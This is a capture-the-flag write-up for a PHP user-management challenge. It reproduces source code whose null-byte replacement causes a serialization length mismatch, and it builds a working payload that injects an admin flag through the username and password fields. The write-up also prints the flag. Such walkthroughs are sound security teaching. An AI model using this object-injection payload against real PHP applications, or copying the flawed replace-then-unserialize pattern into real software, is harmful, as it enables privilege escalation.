## About the Challenge
This challenge will delve deeper into the understanding of PHP serialization. 
We are greeted with a page which lets us create our own private database and create an account
![userman](/static/writeups/photos/userman1.png)
![userman](/static/writeups/photos/userman2.png)

Attempting to login, we are greeted with an error message:
![userman](/static/writeups/photos/userman3.png)

Thus the goal is likely to make ourselves the admin user of this website.

## Examining the Code
The source code is given for this challenge.
```php_RETRACT
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Management</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 20px;
        }
        h1 {
            text-align: center;
            color: #333;
        }
        h2 {
            color: #555;
            border-bottom: 2px solid #ccc;
            padding-bottom: 10px;
        }
        form {
            background: #fff;
            padding: 20px;
            margin: 20px 0;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }
        label {
            display: block;
            margin: 10px 0 5px;
        }
        input[type="text"],
        input[type="password"] {
            width: 98%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        input[type="submit"] {
            background-color: #5cb85c;
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        input[type="submit"]:hover {
            background-color: #4cae4c;
        }
    </style>
</head>
<body>
    <h1>BlahajCorp User Management System</h1>
    <?php 
        function makeDb($name){
            if (!preg_match('/^[0-9]+$/', $name)) {
                echo '<p>No hacking!!! This is not a LFI challenge dammit</p>';
                throw new InvalidArgumentException('Invalid database name. Only numbers are allowed.');
            }
            
            $db = new SQLite3('/var/www/html/databases/'.$name.'.db');

            $db->exec("CREATE TABLE IF NOT EXISTS users (
                username TEXT UNIQUE,
                userObject TEXT
            )");
            return $db;
        }

        class User{
            protected $_username;
            protected $_password;
            protected $_admin;
            protected $_reserved;
            
            public function __construct($username, $password){
                $this->_username = $username;
                $this->_password = $password;
                $this->_admin = false;
                $this->_reserved = "";
            }
            
            public function getName(){
                return $this->_username;
            }
            
            public function checkpass($pass){
                return $this->_password == $pass;
            }
            
            public function isAdmin(){
                return $this->_admin;
            }
        }

        function insertUser($db, $userObject) {
            $userser = str_replace(chr(0) . '*' . chr(0), '\0\0\0', serialize($userObject)); //database does not support null bytes, and the protected field has a \x00*\x00 preface. very bad
            $stmt = $db->prepare("INSERT INTO users (username, userObject) VALUES (:username, :userObject)");
            $stmt->bindValue(':username', $userObject->getName(), SQLITE3_TEXT);
            $stmt->bindValue(':userObject', $userser, SQLITE3_TEXT);
            $stmt->execute();
        }

        function getUserObject($db, $username, $pass){
            $stmt = $db->prepare("SELECT userObject FROM users WHERE username = :username");
            $stmt->bindValue(':username', $username, SQLITE3_TEXT);
            $result = $stmt->execute();
            if ($row = $result->fetchArray(SQLITE3_ASSOC)) {
                $user = unserialize(str_replace('\0\0\0', chr(0) . '*' . chr(0), $row['userObject']));
                if($user->checkpass($pass)){
                    return $user;
                }
                return null;
            } else {
                return null;
            }
        }

        // Handle database creation
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create_db'])) {
            $dbname = random_int(100000, 999999); // Generate a random database name
            makeDb($dbname);
            echo "<p>Database '$dbname' created successfully.</p>";
        }
        // Handle account creation
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username']) && isset($_POST['password']) && isset($_POST['dbname'])) {
            $username = $_POST['username'];
            $password = $_POST['password'];
            
            $dbname = $_POST['dbname'];
            $db = makeDb($dbname);
            
            $user = new User($username, $password);
            insertUser($db, $user);
            echo "<p>Account created successfully for user '$username'.</p>";
        }

        // Handle login
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login_username']) && isset($_POST['login_password']) && isset($_POST['dbname'])) {
            $username = $_POST['login_username'];
            $password = $_POST['login_password'];
            
            $dbname = $_POST['dbname'];
            $db = makeDb($dbname);
            
            $user = getUserObject($db, $username, $password);
            if ($user) {
                echo "<p>Login successful for user '$username'. </p>";
                if ($user->isAdmin()) {
                    echo "<p>Wow, you are an admin! Here is your flag: blahaj{flag}</p>";
                } else {
                    echo "<p>But you are not an admin!</p>";
                }
            } else {
                echo "<p>Invalid username or password.</p>";
            }
        }
    ?>
    <h2>Request New Private Database</h2>
    <form action="" method="POST">
        <input type="hidden" name="create_db" value="1">
        <input type="submit" value="Create Private Database">
    </form>

    <h2>Create New Account</h2>
    <form action="" method="POST">
        <label for="dbname">Database Name:</label>
        <input type="text" id="dbname" name="dbname" required>
        
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required>
        
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>
        
        <input type="submit" value="Create Account">
    </form>

    <h2>Login to Your Account</h2>
    <form action="" method="POST">
        <label for="dbname">Database Name:</label>
        <input type="text" id="dbname" name="dbname" required>
        
        <label for="login_username">Username:</label>
        <input type="text" id="login_username" name="login_username" required>
        
        <label for="login_password">Password:</label>
        <input type="password" id="login_password" name="login_password" required>
        
        <input type="submit" value="Login">
    </form>
    
</body>
</html>
```

The **`User`** class encapsulates user details, including whether the user is an admin. When storing a user in the database, the user object is serialized. However, due to the inability to store null bytes in the database, a specific replacement mechanism is implemented:

**Serialization Process:**
- All occurrences of the string `"{nullbyte}*{nullbyte}"` in the serialized user object are replaced with `"\0\0\0"` before insertion into the database.

**Deserialization Process:**
- When retrieving the user object from the database, the reverse replacement occurs: `"\0\0\0"` is replaced with `"{nullbyte}*{nullbyte}"` to reconstruct the original serialized object.

**The Problem**

This replacement logic introduces a critical flaw if the username contains the string `"\0\0\0"`. Here’s why:

1. Upon serialization, the username `"\0\0\0"` is stored in the database as-is.
2. During deserialization, the string `"\0\0\0"` is replaced with `"{nullbyte}*{nullbyte}"`. This results in a mismatch between the stored and retrieved username.

**Key Observations**

- The original username `"\0\0\0"` is **6 characters long**.
- The replacement string `"{nullbyte}*{nullbyte}"` is **3 characters long**.
- This mismatch in length and content can lead to data corruption or unintended behavior when the username is processed.



## Understanding PHP serialisation
How PHP Serialization Works

To solve the challenge, we need to understand how PHP serialization works. Using the `User` class as an example, here’s a serialized representation of a `User` object that has a username. Note that ! will denote a null byte.

```php
O:4:"User":4:{s:12:"!*!_username";s:4:"Test";s:12:"!*!_password";s:4:"Test";s:9:"!*!_admin";b:0;s:12:"!*!_reserved";s:0:"";}
```

The first part **`O:4:"User":4`** indicates that the data is an object.
  - The first `4` specifies the length of the class name, which is `"User"` (4 characters).
  - The second `4` specifies the number of properties in the object (`username`, `password`, `admin`, `reserved`).
<br />
<br />

Each property is defined in the following format: **`s:12:"!*!_username";s:4:"Test";`**
- `s:12:` indicates that the attribute name is a string with 12 characters (`"!*!_username"`).
- The `!*!_` prefix denotes that the attribute is protected.
- `s:4:"Test";` specifies that the value of the attribute is a string with 4 characters (`"Test"`).

**Key Observations About PHP Serialization**

PHP serialization heavily relies on the lengths defined in the serialized payload. If we manipulate the lengths in the payload to not match the expected values, we can potentially exploit the code.

## Exploiting the length mismatch
As mentioned previously, when **`"\0\0\0"`** is replaced with **`"{nullbyte}*{nullbyte}"`**, the length of the serialised payload will decrease by 3 characters. 
We can expliot this by making the attribute "eat" into the next portions of the serialisation. 

For instance, suppose the original value was:
```php
...s:18:"\0\0\0\0\0\0\0\0\0";s:14:"example";
# Will be replace to become
...s:18:"!*!!*!!*!";s:14:"a\";s:5:\"pwned\"";
```
The length of the serialised payload decreased by a total of 9 characters after the payload. However, the serialisation still indicates 
that there should be a total of 18.

This will cause the serialisation to intepret the entire string of **`!*!!*!!*!";s:14:"a`** as the value of the attribute, effectively removing what was originally there. 

Then, the next value, which is **`;s:5:"pwned"`** will be interpreted as the next serialised attribute instead,
effectively allowing control the value of any attribute in the class.

## Exploiting the challenge
In our case, we want to write a payload to make ourselves admin. First, we need to overflow enough characters in the original serialisation
such that we eat into the "password" value of the serialisation. We need at least 28 overflown characters to do this. 

This translates to 10 instances (rounded up) of **`"\0\0\0"`** in the username.
```php
$username = str_repeat('\0\0\0',10);
```

Then, we need to close off the string in the username inside our password, by adding a **`aa"`** at the start (to account for the extra overflown bits from rounding up the number of "\0\0\0" we need). 


Next, we need to write the "password" and set the "admin" attributes to be true into the serialisation. 

We must ensure we count and create the appropriate length of the reserved value. 
We can do this by adding the following payload:
```php
$priv = chr(0).'*'.chr(0).'_';
$password = "aa\";s:12:\"${priv}password\";s:4:\"Test\";s:9:\"${priv}admin\";b:1;";
```

This is where the **`"reserved"`** attribute comes in. Since we need to remove the original admin attribute from the serialisation, we can use the **`"reserved"`** attribute to convert the entire portion of serialisation that comes after it to be interpreted as the value of the attribute. 

We will used the closing **`"`** in the **original** **`"reserved"`** attribute to close off the string in the reserved attribute we have crafted.
```php
$password = "aa\";s:12:\"{$priv}password\";s:4:\"Test\";s:9:\"{$priv}admin\";b:1;s:12:\"{$priv}reserved\";s:48:\";";
```

When serialised, the payload will look like
```php
O:4:"User":4:{s:12:"!*!_username";s:60:"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";s:12:"!*!_password";s:82:"aa";s:12:"!*!_password";s:4:"Test";s:9:"!*!_admin";b:1;s:12:"!*!_reserved";s:48:";";s:9:"!*!_admin";b:0;s:12:"!*!_reserved";s:0:"";}
```

When the **`"\0\0\0"`** is replaced, it will look like this:
```php
O:4:"User":4:{s:12:"!*!_username";s:60:"!*!!*!!*!!*!!*!!*!!*!!*!!*!!*!";s:12:"!*!_password";s:82:"aa";s:12:"!*!_password";s:4:"Test";s:9:"!*!_admin";b:1;s:12:"!*!_reserved";s:48:";";s:9:"!*!_admin";b:0;s:12:"!*!_reserved";s:0:"";}
```
with **`!*!!*!!*!!*!!*!!*!!*!!*!!*!!*!";s:12:"!*!_password";s:82:"aa`** being interpreted as the username.

We can submit the user as ***`\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0`*** with password of ***`Test`*** and we will get our flag.

## Flag
```
blahaj{d1Dnt_kN0w_pHP_C0u1D_0V3rf10W}
```
## Resources
- [PHP Overflow](https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/)

## Afterword
I couldn't solve this in time during the actual ctf, and took an actual hour to actually craft the working payload. This is a creative challenge,
would have definitely enjoyed it more if I solved it in time though :C . Was my 1 challenge away from FCing

